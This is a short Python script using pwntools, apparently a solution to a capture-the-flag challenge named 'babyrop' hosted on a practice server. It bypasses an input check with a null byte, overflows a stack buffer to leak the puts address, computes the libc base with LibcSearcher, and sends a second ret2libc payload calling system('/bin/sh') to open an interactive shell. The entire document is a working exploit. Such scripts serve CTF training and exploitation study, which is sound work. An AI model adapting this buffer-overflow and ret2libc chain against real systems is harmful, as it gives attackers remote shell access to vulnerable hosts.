from pwn import *
from LibcSearcher import *
context.log_level = 'debug'

conn = remote(b'node4.buuoj.cn', 26654)

#conn = process('./babyrop')
#gdb.attach(conn, 'b read')

elf = ELF('./babyrop')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = 0x080485a0
ret = 0x08048824

payload1 = b'\x00' + b'abcdef' + b'\xff'
conn.sendline(payload1)
conn.recvuntil(b'Correct\n')
payload = b'a' * (0xe7 + 0x4) + p32(puts_plt) + p32(main) + p32(puts_got)
conn.sendline(payload)
leak_addr = u32(conn.recv()[:-1])
libc = LibcSearcher('puts', leak_addr)
libc_base = leak_addr - libc.dump('puts')
system = libc_base + libc.dump('system')
binsh = libc_base + libc.dump('str_bin_sh')

conn.sendline(payload1)
conn.recvuntil(b'Correct\n')
payload = b'a' * (0xe7 + 0x4) + p32(system) + p32(0) + p32(binsh)
conn.sendline(payload)
conn.interactive()
